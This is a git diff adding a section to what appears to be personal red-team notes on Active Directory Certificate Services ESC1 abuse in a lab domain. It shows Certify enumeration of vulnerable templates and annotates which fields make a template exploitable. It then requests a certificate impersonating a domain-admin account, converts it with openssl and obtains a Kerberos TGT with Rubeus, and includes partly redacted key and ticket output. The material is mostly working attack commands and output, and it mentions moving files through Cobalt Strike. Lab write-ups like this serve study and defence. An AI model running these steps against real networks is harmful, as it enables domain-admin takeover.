@@ -409,6 +409,347 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'svc_admin@hacklab.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
 ```
 
+**Using Certify**
+
+Finding Vulnerable certs
+
+```
+C:\Users\g.white\Desktop\Tools>Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=hacklab,DC=local'
+
+[*] Listing info about the Enterprise CA 'hacklab-WIN-8HPLF8PSHC1-CA'
+
+    Enterprise CA Name            : hacklab-WIN-8HPLF8PSHC1-CA
+    DNS Hostname                  : WIN-8HPLF8PSHC1.hacklab.local
+    FullName                      : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=hacklab-WIN-8HPLF8PSHC1-CA, DC=hacklab, DC=local
+    Cert Thumbprint               : 51A0D5E415EF8F50F5B4CA8CEC632B3D5A85F9E7
+    Cert Serial                   : 354DB064F33080BD4EB9FEAABE87DCF1
+    Cert Start Date               : 23/04/2024 14:56:37
+    Cert End Date                 : 23/04/2029 15:06:33
+    Cert Chain                    : CN=hacklab-WIN-8HPLF8PSHC1-CA,DC=hacklab,DC=local
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+      Allow  ManageCA, ManageCertificates               HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable certificate templates that exist but an Enterprise CA does not publish:
+
+    ESC3-Vuln2
+
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA
+    Template Name                         : ESC1-Vun1
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication
+    mspki-certificate-application-policy  : Client Authentication, Server Authentication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Domain Computers      S-1-5-21-2199964591-1196550447-1073987862-515
+                                      HACKLAB\Domain Users          S-1-5-21-2199964591-1196550447-1073987862-513
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+                                      NT AUTHORITY\Authenticated UsersS-1-5-11
+      Object Control Permissions
+        Owner                       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+        WriteOwner Principals       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+        WriteDacl Principals        : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+        WriteProperty Principals    : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+
+    CA Name                               : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA
+    Template Name                         : Vuln_Cert
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Domain Users          S-1-5-21-2199964591-1196550447-1073987862-513
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+                                      NT AUTHORITY\Authenticated UsersS-1-5-11
+      Object Control Permissions
+        Owner                       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+        WriteOwner Principals       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+        WriteDacl Principals        : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+        WriteProperty Principals    : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+
+
+
+Certify completed in 00:00:01.2930508
+```
+
+**The following details the sections that make a certificate vulnerable to ESC1, please seek the sections with the ** for more info.**
+
+```
+CA Name                               : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA
+    Template Name                         : ESC1-Vun1 - **You need this** 
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT - **To be vuln it has to say ENROLLEE_SUPPLIES_SUBJECT**
+    mspki-enrollment-flag                 : PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication  - **To be vuln it has to include Client Authentication**
+    mspki-certificate-application-policy  : Client Authentication, Server Authentication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Domain Computers      S-1-5-21-2199964591-1196550447-1073987862-515
+                                      HACKLAB\Domain Users          S-1-5-21-2199964591-1196550447-1073987862-513
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+                                      NT AUTHORITY\Authenticated UsersS-1-5-11 - **To be vuln it has to include Authenticated UsersS-1-5-11**
+      Object Control Permissions
+        Owner                       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+        WriteOwner Principals       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+        WriteDacl Principals        : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+        WriteProperty Principals    : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
+                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
+                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
+```
+
+Exploiting the certificate and requesting a certificate associated with the account that belongs to the domain admins group.
+
+```
+C:\Users\g.white\Desktop\Tools>certify.exe request /ca:WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA /template:ESC1-Vun1 /altname:da1
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : HACKLAB\g.white
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : ESC1-Vun1
+[*] Subject                 : CN=g.white, OU=Administration, OU=Head_Office, OU=Departments, DC=hacklab, DC=local
+[*] AltName                 : da1
+
+[*] Certificate Authority   : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 15
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsNLW/YHm5zlhkQe0oGGEvHge3RYqtmChX7R6OpWWQc8fevLs
+Q18laqoZferjm5GPwADobns8Ll1zcE01fy+ifLVR3LGJV67usQcdRVMZmNcgxs9n
+YtWL11EzPMF1I9tGx0kbIPfw1Y+EmMTeb7Jr7PfcLtzm0o29FriLtKrqkTaQB4+R
+Ab2wS1mIQJ34H+zRGALkw1zHi1SXjgxQV/XQraudgIOEtOhL83TMGVpmLSyPWN3Q
+97ptHY41hg8SuakASciZmImvqLd5jieafgPYLfmWF+WYuq5PPyGRg0XqVQ9MXG6a
+zatLC4grP-Redacted-Ia0aSwBxGM975oj/WOXO8I5N64o+yH6
+8MeRU6RdNQdbJ79n0v75aqSV/oHeneEBN5t3/A+kntiXEi05LqWrXE7QyPkLZfvB
+CHMYqK2D1R+lcFu8FPzkTXPxfgqTJUJqSJ3+zBDw7nH4RlilMEaWY10GxyoLj8O2
+xOu6GF+RAoGBAN61sAk26pjaSr80EIm8Vf1RMWGFu7/uIWHZ9x4de2xEfjMSid72
+oaJFp7e7p9XdAcFFseF2Myt2WK5hB0xv6QcCHIYVX0ODRELe3RHm/TZOLVeqxZO0
+nGIoZw93QvGNM/Ku1R+J7sxQSwucy853Btz++fIrDmgUfyzgEmxLX2vTAoGBAMtB
+QK2qYbjIW5pMtQLTxQ3fTuPzcTViYHScbE0FfWCxzyiZK12uRH7A97nHhdtyw+s4
+ous4z012U3aVv4-Redacted-pDlRjOJiNVdcAVdDFq58r
+ShxKaEzeUxK4nHhDoqdXLtcAxHEi8ZasjLgAv5/DkpGxmwSxoMPGZJKj4UoKZZGt
+NiEugT4VjFQn+/qITM2NC+CLAoGAaCwQbzG1FhSyRjnsR/+rrjl2YIRj0F2UXA/T
+vgIDSWy4ZPFj9Yacmm5iSPhG1btTSJplfbNHJEdx7YRAe1ISEMmmrTDsMCqkMRNX
+5oUlL+lNcF7Goj4qS6sA0WU1KxblpGu4zggpeLTvQ9yVXv4M8oWOBKFIPmKv9qm6
+ZO2IOy8CgYAeF18wJSkfYmqk4hYhopzWQP5v0gOvENAe1v8hsT8LtYMPUCRGpcoC
+mKHvi46BRdYBpOI6uh30xuvbahy19v6O+8R966X7piFnFpzUQi0GHUe9OBCQZiWo
+D5ktQd28gl0x6AnnPt9p1ZXSEbMI8afxcQHZn7kdfxWOnC/1OTiN6A==
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGHjCCBQagAwIBAgITHAAAAA/TpYI1etGPcAAAAAAADzANBgkqhkiG9w0BAQsF
+ADBVMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgdoYWNr
+bGFiMSMwIQYDVQQDExpoYWNrbGFiLVdJTi04SFBMRjhQU0hDMS1DQTAeFw0yNDA3
+MTUxMTI1MTZaFw0yNTA3MTUxMTI1MTZaMIGHMRUwEwYKCZImiZPyLGQBGRYFbG9j
+YWwxFzAVBgoJkiaJk/IsZAEZFgdoYWNrbGFiMRQwEgYDVQQLEwtEZXBhcnRtZW50
+czEUMBIGA1UECwwLSGVhZF9PZmZpY2UxFzAVBgNVBAsTDkFkbWluaXN0cmF0aW9u
+MRAwDgYDVQQDEwdnLndoaXRlMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
+AQEAsNLW/YHm5zlhkQe0oGGEvHge3RYqtmChX7R6OpWWQc8fevLsQ18laqoZferj
+m5GPwADobns8Ll1zcE01fy+ifLVR3LGJV67usQcdRVMZmNcgxs9nYtWL11EzPMF1
+I9tGx0kbIPfw1Y-Redacted-PEdIevkzuBaITl5VaD9cE4AgFkAgEI
+MB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAOBgNVHQ8BAf8EBAMCBaAw
+JwYJKwYBBAGCNxUKBBowGDAKBggrBgEFBQcDATAKBggrBgEFBQcDAjAdBgNVHQ4E
+FgQUeMBVjiux6/Z28M2g+1iGdQstLOEwHgYDVR0RBBcwFaATBgorBgEEAYI3FAID
+oAUMA2RhMTAfBgNVHSMEGDAWgBSAEotT6qXYz/osdwaI1ufK7UYqHDCB4gYDVR0f
+BIHaMIHXMIHUoIHRoIHOhoHLbGRhcDovLy9DTj1oYWNrbGFiLVdJTi04SFBMRjhQ
+U0hDMS1DQSxDTj1XSU4tOEhQTEY4UFNIQzEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
+eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFj
+a2xhYixEQz1sb2NhbD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2Jq
+ZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgc4GCCsGAQUFBwEBBIHBMIG+
+MIG7BggrBgEFBQcwAoaBrmxkYXA6Ly8vQ049aGFja2xhYi1XSU4tOEhQTEY4UFNI
+QzEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja2xhYixEQz1sb2NhbD9jQUNlcnRp
+ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAN
+BgkqhkiG9w0BAQsFAAOCAQEAgrGix8g/O+/lrkDJPslz+LBFfA4I8g5vsue3zYqL
+7xA0pTibfgnYfP32UfR+dSMJEBE8uo0hA2Wl+Lo0E5O4Xzmsu/7blgc3nf5FsyDP
+Tr3Wyg9cpkXkVDb4cTOHQ3kKvKPfEQjnXRpMxKk1Wy5MHxmgezH5tbAQHdBdrLMt
+F4oXLfvFF5dRikkbdZoFK/EXl8jKcrDYkIH3EssXUN1MqrB6vdi5EjNw+zslcKoo
+HzBxq/0vAb6vp5WpKB7fnCDTwJK0zMgGFtYdHRk+BDX6bmMYwYLLFSbFlkbxyxpI
+C3BkT38Cq+TP9uEcy1WbqCWgMO9gSzp3TVzwFzwXPT4LYw==
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+
+
+Certify completed in 00:00:04.7931478
+```
+
+**Copy from  -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- section to a file on Linux/macOS open nano and save the contents as cert.pem, and run the openssl command to convert it to a .pfx. When prompted, don't enter a password:**
+
+```
+ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Enter Export Password:
+Verifying - Enter Export Password:
+```
+
+**Finally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the altname user using Rubeus:**
+
+```
+C:\Users\g.white\Desktop\Tools>Rubeus.exe asktgt /user:da1 /certificate:C:\Users\g.white\Desktop\Tools\Cert\cert.pfx
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.1
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=g.white, OU=Administration, OU=Head_Office, OU=Departments, DC=hacklab, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'hacklab.local\da1'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGDjCCBgqgAwIBBaEDAgEWooIFJTCCBSFhggUdMIIFGaADAgEFoQ8bDUhBQ0tMQUIuTE9DQUyiIjAg
+      oAMCAQKhGTAXGwZrcmJ0Z3QbDWhhY2tsYWIubG9jYWyjggTbMIIE16ADAgESoQMCAQOiggTJBIIExbtJ
+      /CkJ3ysfomHsKTwE/slEePtK76iHyi+mo8vYSfVu64lXcVFLGnRrpGnmbVYbCzTWGE+BmDHd2oiMdbO/
+      e78+1Z6zgBsRxyPvDb/YthECsuZSMaLdloXUW+vSxxj2BUQtqJqnDlJ9OehTh0p37TvZVFMzdZrc9v7S
+      uRSIQJM0RcKvLJqI+hQQYZPLruqGgKVXYru10DduizHARuqrdbzFUFNHcV3HrT4gYGUbyj+flXYkWo1l
+      4AQs4E+wTrXxv6PncX5EJmGf1TpE7B4ZW9SGSaydZqLt1tq5SPKjTh2i5JWCcl4H/1C0yRPL05XRY9Nh
+      oRJy2Dkx7pLt+yZVpfrGcM5t5G7E2N6rgItVlKnhyTkRpf+nzvPwujISv7TfigY6p8VMUyhfTGOEncZK
+      HMxUxNUWvMhrq4I4jEno6Ql2RZpOrcZ826D3AGT8cAPzEGw/UH3+ZpA4Fyqcz3O0Wot97eBWT66XPQRI
+      fPfpjGcu7ROT37fHIPLLGpBsVPz1Q3m8137M/q/RD/Fwni//cxIH8BwGms76eYIIjLhopyEMeTbD6j1y
+      ulWw8hbeSzGpc70ReOEYO5Xhu4CsCE0xNo6VuSsDPoIDLTGMcU3dL5pgOA+lwACYRtb5qUAM8Ymib6O4
+      nwDt8tRD0wkBEJKQt2hSLQz-Redacted-ZfsnkwH4q1PGA2KowtK07Os5gbkxKo
+      VgELxPWxj7pqr8JpZVDWT7w+mj8/v4eoj6UKt2qpiySCyg6SWCz1M0YRGd7nWmLVzyvMVogUtv1a00kE
+      dOJnjv19Q7l7+O74Pd0rX/EMH3/yfk5yNUpXvU4FiFe4MxOJjpZweknCa/OvossyhDvWpaHqD+Ag7A6U
+      2eFvNyZjqEsLa8whe5fWh5ekFkCiaf0lNqjSm5gHBw4yXqxnECBid9RuvxaWJcPBEkzg0DCkx927PfI0
+      RbLKlp7FtrBY5AjQYGKUXiV4j6sr7cWaN5WjvwAv6mxQ6FRzJaD6j6G1WZx8eUCr3kW+GTht5YLkzEqW
+      WE6MutLZZ8i5UQrB8AXcI6dDrbWd3Pez8MbGy2CPJOiGLkwRsOpDcIBKi2npHbRTy+IRFSdB1RXKmwWF
+      umxGF0B708p9klh8GruWnjBENgtavrSogbHuwVrLaBPYVfBcgG4CQRupBgQlAb3/5wFIQBScuDpel0hr
+      zUJZRYzjpLk8iX/j4MR4RwNf4aOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEX
+      oRIEEFIaGS8R6f/MBX769dkk7fahDxsNSEFDS0xBQi5MT0NBTKIQMA6gAwIBAaEHMAUbA2RhMaMHAwUA
+      QOEAAKURGA8yMDI0MDcxNTEyMjUwNVqmERgPMjAyNDA3MTUyMjI1MDVapxEYDzIwMjQwNzIyMTIyNTA1
+      WqgPGw1IQUNLTEFCLkxPQ0FMqSIwIKADAgECoRkwFxsGa3JidGd0Gw1oYWNrbGFiLmxvY2Fs
+
+  ServiceName              :  krbtgt/hacklab.local
+  ServiceRealm             :  HACKLAB.LOCAL
+  UserName                 :  da1
+  UserRealm                :  HACKLAB.LOCAL
+  StartTime                :  15/07/2024 13:25:05
+  EndTime                  :  15/07/2024 23:25:05
+  RenewTill                :  22/07/2024 13:25:05
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  UhoZLx-Redacted-r12STt9g==
+  ASREP (key)              :  902A410-Redacted-F7F5D96D
+
+
+C:\Users\g.white\Desktop\Tools>
+```
+
+
+
+
+
+**Using Certify errors**
+
+The below error was caused because I executed the certify.exe file without also moving the Interop.CERTENROLLLib.dll file. Add the Interop.CERTENROLLLib.dll file to the same directory and the problem is fixed. 
+
+```
+C:\Users\g.white\Desktop\Tools>certify.exe request /ca:WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA /template:ESC1-Vun1 /altname:da1
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[!] Unhandled Certify exception:
+
+System.IO.FileNotFoundException: Could not load file or assembly 'Interop.CERTENROLLLib, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The system cannot find the file specified.
+File name: 'Interop.CERTENROLLLib, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
+   at Certify.Cert.RequestCert(String CA, Boolean machineContext, String templateName, String subject, String altName, String sidExtension, Boolean install)
+   at Certify.Commands.Request.Execute(Dictionary`2 arguments)
+   at Certify.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
+   at Certify.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)
+```
+
+
+
 
 **Creating Vulnerable ESC1 Certificate**
 
